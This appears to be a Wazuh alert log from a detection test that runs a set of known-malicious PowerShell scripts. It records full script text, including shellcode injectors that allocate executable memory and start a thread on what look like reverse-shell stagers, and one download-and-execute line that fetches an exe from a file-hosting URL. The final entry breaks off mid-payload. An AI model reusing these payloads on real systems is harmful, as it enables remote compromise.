{"timestamp":"2026-07-06T02:18:21.556+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":40,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304301.1918665","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:18:42.1757622Z","eventRecordID":"144820","processID":"9116","threadID":"8788","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x0a,0x06,0x0a,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 9b5ed4a5-3ecc-4d06-974e-3522d2c4a90c\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\140.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x0a,0x06,0x0a,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"9b5ed4a5-3ecc-4d06-974e-3522d2c4a90c","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\140.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:18:23.068+0000","rule":{"level":4,"description":"Powershell script querying system environment variables","id":"91816","mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]},"firedtimes":5,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304303.1929610","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:18:42.9653052Z","eventRecordID":"144824","processID":"3148","threadID":"7128","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/bvudaf.exe', $dpl);Start-Process $dpl\r\n\r\nScriptBlock ID: 3d6a2404-8e1e-4ac9-8c20-04b93078c890\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1405.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/bvudaf.exe', $dpl);Start-Process $dpl","scriptBlockId":"3d6a2404-8e1e-4ac9-8c20-04b93078c890","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1405.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:18:24.010+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":41,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304304.1932093","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:18:43.8636042Z","eventRecordID":"144828","processID":"9124","threadID":"1060","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x00,0x01,0x75,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 4442ef7f-fd4c-46c6-810e-bddf54339a68\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1421.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x00,0x01,0x75,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"4442ef7f-fd4c-46c6-810e-bddf54339a68","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1421.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:18:24.125+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":42,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304304.1943042","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:18:44.6979588Z","eventRecordID":"144832","processID":"7176","threadID":"6860","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x05,0xe6,0xea,0x1b,0x68,0x02,0x00,0xb0,0x44,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 5ce8e7ce-eafc-48f6-97f6-00c4b123e09d\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1429.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x05,0xe6,0xea,0x1b,0x68,0x02,0x00,0xb0,0x44,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"5ce8e7ce-eafc-48f6-97f6-00c4b123e09d","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1429.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:18:25.609+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":43,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304305.1953991","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:18:45.5728690Z","eventRecordID":"144836","processID":"6624","threadID":"8552","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x6e,0x68,0x02,0x00,0x00,0x50,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0x